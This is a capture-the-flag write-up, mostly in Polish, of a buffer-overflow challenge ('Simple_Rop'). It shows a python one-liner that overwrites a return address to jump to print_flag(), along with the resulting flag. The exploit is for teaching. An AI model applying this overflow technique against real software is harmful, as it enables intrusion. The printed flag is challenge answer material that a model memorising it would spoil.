## Simple_Rop [EXP 120]

>On the shell there is a folder /problems/simple-rop.
>
>Read flag.txt

* [Source](simple-rop.c)
* [Binary](simple-rop)

### EN / [PL](#rozwiązanie)

### Solution:

### [EN](#solution) / PL

### Rozwiązanie:

```
$ objdump -d simple-rop > objdump
```

[objdump](objdump) - zacząłem od deasemblacji `simple-rop`.

W pliku `simple-rop.c` widać, że w programie znajduje się funkcja `print_flag()` czytająca plik z flagą, ale nie jest ona nigdzie wywoływana.
Po uruchomieniu programu w `main` wywoływana jest tylko funkcja `what_did_you_say()`, która wypisuje na ekran to co podaliśmy w argumencie.

W `objdump` można znaleźć funkcję `print_flag()`: `0804851a <print_flag>`. Obok podany jest jej adres w pamięci.

 `what_did_you_say()` zapisuje nasz input do 64-znakowej zmiennej `buff`. Moje rozwiązanie ograniczyło się do przepełnienia tego bufora i dopisaniu na końcu `\x1a\x85\x04\x08` czyli adresu `print_flag()`. Następnie stopniowo zwiększałem swój input aż nadpisałem właściwą sekcję i udało mi się zdobyć flagę. 

```
user74638@easyctf:/problems/simple-rop$ (python -c 'print "A"*76 + "\x1a\x85\x04\x08"')| ./simple-rop           
You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
easyctf{r0p_7o_v1ct0ry}                                                                                         
                                                                                                                
Segmentation fault (core dumped)                                                                                
```
